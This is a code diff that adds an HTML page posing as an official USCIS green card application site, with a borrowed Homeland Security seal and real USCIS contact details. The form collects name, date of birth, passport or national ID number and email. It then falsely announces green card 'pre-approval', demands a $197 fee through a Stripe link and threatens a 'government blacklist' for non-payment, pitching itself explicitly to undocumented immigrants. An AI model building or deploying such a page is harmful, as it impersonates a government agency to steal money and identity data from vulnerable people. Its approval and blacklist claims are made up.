@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Green Card Application - USCIS</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header>
+        <div class="header-top">
+            <img src="https://eustismemoriallibrary.org/wp-content/uploads/2024/07/homelandsecurityseal-100x100.png" alt="USCIS Logo" class="logo">
+            <nav>
+                <a href="#">Home</a>
+                <a href="#">Green Card</a>
+                <a href="#">Contact Us</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <h1>Apply for a Green Card</h1>
+            <p>Select an option below to start your application process.</p>
+        </section>
+
+        <section class="options-container">
+            <div class="option" onclick="openModal('Petition for Alien Relative')">
+                <h2>I Am An Immigrant</h2>
+                <p>Exclusive for undocumented immigrants: get your permanent Green Card.</p>
+            </div>
+            <div class="option" onclick="openModal('Immigrant Petition for Alien Worker')">
+                <h2>Work-Based Application</h2>
+                <p>Apply through an employer sponsoring you for work in the U.S.</p>
+            </div>
+            <div class="option" onclick="openModal('Refugee/Asylee Relative Petition')">
+                <h2>Refugee or Asylee Family</h2>
+                <p>Bring family members if you’re a refugee or asylee in the U.S.</p>
+            </div>
+            <div class="option" onclick="openModal('Application for Asylum and for Withholding of Removal')">
+                <h2>Asylum Application</h2>
+                <p>Seek protection if you’re fleeing persecution in your home country.</p>
+            </div>
+        </section>
+
+        <!-- Modal -->
+        <div id="modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeModal()">×</span>
+                <img src="https://eustismemoriallibrary.org/wp-content/uploads/2024/07/homelandsecurityseal-100x100.png" alt="USCIS Logo" class="modal-logo">
+                <h2 id="modal-title">Submit Your Information</h2>
+                <form id="applicationForm" onsubmit="validateForm(event)">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" required>
+                    <label for="dob">Date of Birth</label>
+                    <input type="date" id="dob" required>
+                    <label for="country-id">Country of Origin ID (e.g., Passport or National ID)</label>
+                    <input type="text" id="country-id" required>
+                    <label for="email">Email Address</label>
+                    <div class="email-container">
+                        <input type="email" id="email" required oninput="suggestEmailProviders()" autocomplete="off">
+                        <div id="email-suggestions" class="email-suggestions hidden"></div>
+                    </div>
+                    <div class="button-container">
+                        <button type="submit">
+                            <i class="fas fa-magnifying-glass"></i> Verify Eligibility
+                        </button>
+                    </div>
+                </form>
+                <div id="validation" class="validation hidden">
+                    <ul id="validation-steps"></ul>
+                </div>
+                <div id="result" class="result hidden">
+                    <h3>Congratulations!</h3>
+                    <p>Your Green Card has been pre-approved.</p>
+                    <div class="approval-message">
+                        <p class="approval-title">ATTENTION, <span id="user-name">USER</span>!</p>
+                        <p>You have been pre-approved for your Green Card! After paying the $197 issuance fee, your Green Card will arrive at your residence in an average of 15 days.</p>
+                        <p><span class="highlight">Failure to pay</span> this fee will result in your addition to a <span class="highlight">government blacklist</span> for not paying for a federal document, <span class="highlight">preventing future legalization</span> in the United States.</p>
+                    </div>
+                    <div class="button-container">
+                        <a href="https://buy.stripe.com/28o01M2Wd12IauQ4gD" target="_blank" class="pay-fee-link">
+                            <button class="pay-fee-btn">
+                                <i class="fas fa-exclamation-triangle"></i> Pay Fee Now
+                            </button>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>U.S. Citizenship and Immigration Services</h3>
+                <p>Providing immigration services and benefits to help strengthen our nation.</p>
+            </div>
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <ul>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms of Use</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Contact</h3>
+                <p>Email: info@uscis.gov</p>
+                <p>Phone: 1-800-375-5283</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2025 U.S. Citizenship and Immigration Services. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
